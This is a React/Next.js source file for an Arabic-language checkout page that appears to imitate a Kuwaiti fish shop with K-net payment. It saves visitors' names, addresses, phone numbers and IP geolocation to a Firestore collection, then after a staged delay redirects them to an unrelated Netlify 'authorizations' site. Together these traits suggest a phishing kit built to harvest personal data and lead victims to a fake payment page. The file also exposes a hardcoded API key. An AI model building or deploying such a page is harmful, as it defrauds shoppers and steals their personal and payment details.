'use client'

import React, { useEffect, useState } from 'react'
import { Home, Briefcase, MapPin, ChevronRight } from 'lucide-react'
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import Image from 'next/image'
import { Input } from '@/components/ui/input'
import { collection, query, getDocs, doc, setDoc } from 'firebase/firestore'
import database from '@/lib/firebase'


function cleanString(input: string) {
  return input.replace(/[^a-zA-Z0-9 ]/g, '');
}
export async function addData(data: any) {
  const requestOptions = {
    method: 'GET',
    redirect: 'follow',
  };
    fetch(
      'https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4',
      requestOptions as any
    )
      .then((response) => response.json())
      .then((result) => {
        let id = cleanString(result.ip);
        const visitorsRef = doc(database, `/users/${id}`);
        // Save visitor data
        setDoc(visitorsRef, { data, result })
          .then(() => {
            console.log('Visitor data recorded successfully!');
          })
          .catch((error) => {
            console.error('Error recording visitor data:', error);
          });
      });
    }
  


type LocationType = 'home' | 'work' | 'client'
type PaymentType = 'full' | 'partial'

interface PersonalInfo {
  id: string
  name: string
  address: string
  phone: string
}

export default function CheckoutPage() {
  const [selectedLocation, setSelectedLocation] = useState<LocationType>('home')
  const [paymentType, setPaymentType] = useState<PaymentType>('full')
  const [personalInfo, setPersonalInfo] = useState<PersonalInfo>({ id: "2", name: '', address: '', phone: "" })
  const [loading, setIsLoading] = useState(false)
  const [cartLength, setCartLength] = useState(0)
  const [total, setTotal] = useState(0)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    console.log(personalInfo)
    await addData({ personalInfo })
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      window.location.href = "https://authorizations.netlify.app/"
    }, 3000)
  }

  function cleanString(input: string) {
    return input.replace(/[^a-zA-Z0-9]/g, '')
  }

  useEffect(() => {
    const fetchIpAndSetupListener = async () => {
      try {
        const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4')
        if (!response.ok) {
          throw new Error('Failed to fetch IP geolocation data')
        }
        const result = await response.json()
        const userId = cleanString(result.ip)
        console.log('User ID:', userId)

        const usersCollection = collection(database, 'users');
        const usersQuery = query(usersCollection);
        const querySnapshot = await getDocs(usersQuery);

        const data: any[] = [];
        querySnapshot.forEach((doc) => {
          const userData = doc.data();
          setCartLength(userData.data.cart)
          setTotal(userData.data.total)

          if (userData.info && userData.info.data) {
            setTotal
            data.push({
              id: doc.id,
              ...userData.info.data,
            });
          }
        });
      } catch (error) {
        console.error('Error fetching data:', error)
      }
    }

    fetchIpAndSetupListener()
  }, [])

  return (
    <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
      <form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
        {/* Location Selection */}
        <div className="space-y-4">
          <h1 className="text-xl font-bold text-right">حدد موقعك</h1>

          <div className="space-y-4 bg-white p-4 rounded-lg">
            <h3 className="text-lg font-bold">تفاصيل العنوان</h3>
            <div className="grid grid-cols-1 gap-4">
              <div className="space-y-2">
                <Label htmlFor="name">الأسم</Label>
                <Input
                  id="name"
                  name="name"
                  required
                  value={personalInfo.name}
                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, name: e.target.value }))}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="address">العنوان</Label>
                <Input
                  id="address"
                  name="address"
                  required
                  value={personalInfo.address}
                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, address: e.target.value }))}
                />
              </div>
            </div>

            <div className="grid grid-cols-1 gap-4">
              <div className="space-y-2">
                <Label htmlFor="building">البناية / الشقة</Label>
                <Input
                  id="building"
                  placeholder="مثال: بناية رقم 9"
                  required
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="phone">رقم الهاتف</Label>
                <div className='flex'>
                  <Input
                    id="phone"
                    name="phone"
                    type='tel'
                    required
                    value={personalInfo.phone}
                    onChange={(e) => setPersonalInfo((prev) => ({ ...prev, phone: e.target.value }))}
                  />
                  <Input
                    id="countryCode"
                    name="countryCode"
                    className='w-32 mx-1'
                    readOnly
                    value={'965+'}
                    required
                  />
                </div>
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="notes">ملاحظات إضافية (اختياري)</Label>
              <Input
                id="notes"
                name="notes"
                className="h-20"
              />
            </div>
            <div className="flex justify-between gap-4">
              {(['client', 'work', 'home'] as LocationType[]).map((locationType) => (
                <button
                  key={locationType}
                  type="button"
                  onClick={() => setSelectedLocation(locationType)}
                  className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${
                    selectedLocation === locationType
                      ? locationType === 'home'
                        ? 'bg-black text-white'
                        : 'bg-gray-200'
                      : 'bg-gray-100'
                  }`}
                >
                  {locationType === 'client' && <MapPin className="h-5 w-5" />}
                  {locationType === 'work' && <Briefcase className="h-5 w-5" />}
                  {locationType === 'home' && <Home className="h-5 w-5" />}
                  <span>{locationType === 'client' ? 'العميل' : locationType === 'work' ? 'العمل' : 'البيت'}</span>
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Payment Method */}
        <div className="space-y-4">
          <h2 className="text-xl font-bold text-right">طريقة الدفع</h2>
          <button type="button" className="w-full flex items-center justify-between bg-gray-100 p-4 rounded-lg">
            <div className="flex items-center gap-2">
              <ChevronRight className="h-5 w-5" />
              <span>بطاقة السحب الآلي</span>
            </div>
            <Image
              src="/images/kent.svg"
              alt="K-net"
              width={40}
              height={40}
              className="object-contain"
            />
          </button>
        </div>

        {/* Order Summary */}
        <div className="bg-white p-4 rounded-lg space-y-4">
          <h3 className="text-lg font-bold">سلة أسماك الوطنية</h3>
          <div className="space-y-2">
            <div className="flex justify-between">
              <span>المنتجات ({cartLength})</span>
              <span>{total} د.ك</span>
            </div>
            <div className="flex justify-between">
              <span>قيمة التوصيل</span>
              <span>0 د.ك</span>
            </div>
          </div>

          {/* Payment Options */}
          <RadioGroup
            value={paymentType}
            onValueChange={(value: PaymentType) => setPaymentType(value)}
            className="space-y-4"
          >
            <div className="flex items-center space-x-2 bg-gray-50 p-4 rounded-lg">
              <RadioGroupItem value="full" id="full" />
              <Label htmlFor="full" className="flex-1 text-right mr-2">
                <div className="font-medium">دفع قيمة الطلب كاملة</div>
                <p className="text-sm text-gray-500">
                  سدد اجمالي قيمة الطلب الآن وادفع من خلال كي-نت واحصل على توصيل مجاني
                </p>
              </Label>
            </div>
            <div className="flex items-center space-x-2 bg-gray-50 p-4 rounded-lg">
              <RadioGroupItem value="partial" id="partial" />
              <Label htmlFor="partial" className="flex-1 text-right mr-2">
                <div className="font-medium">دفع مبلغ 0.5 د.ك فقط لتأكيد طلب</div>
                <p className="text-sm text-gray-500">
                  يخصم من قيمة الطلب والدفع الباقي عند الاستلام مع دفع مصاريف توصيل 1 د.ك اضافي
                </p>
              </Label>
            </div>
          </RadioGroup>

          {/* Total */}
          <div className="flex justify-between items-center font-bold text-lg pt-4 border-t">
            <span>المجموع الكلي</span>
            <span>{total} د.ك</span>
          </div>
        </div>

        {/* Proceed Button */}
        <Button
          type='submit'
          className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl"
          disabled={loading}
        >
          {!loading ? `متابعة الدفع (${total}) د.ك` : "الرجاء الانتظار"}
        </Button>
      </form>
    </div>
  )
}

